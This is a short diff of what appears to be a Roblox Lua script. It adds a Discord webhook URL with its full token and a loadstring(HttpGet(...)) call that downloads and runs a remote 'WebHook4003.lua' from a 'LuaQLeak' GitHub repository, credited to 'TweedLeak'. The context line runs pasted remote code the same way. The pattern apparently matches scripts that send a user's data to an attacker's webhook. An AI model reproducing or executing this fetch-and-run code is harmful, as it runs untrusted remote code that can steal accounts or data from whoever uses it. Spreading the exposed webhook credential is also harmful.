@@ -19,7 +19,11 @@ loadstring(game:HttpGet("https://pst.klgrth.io/paste/e3d52/raw"))()
 
 
 
+getgenv().WebhookHere = "https://discord.com/api/webhooks/1058776493007851660/DMrmhY5XJu4PO_vM8sSH2MQWpQ8uTmHertdJy3ENol2IvAG_DFFjYZW102_NuLMCCW8g"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
 
+--by TweedLeak#4003
 
 
 
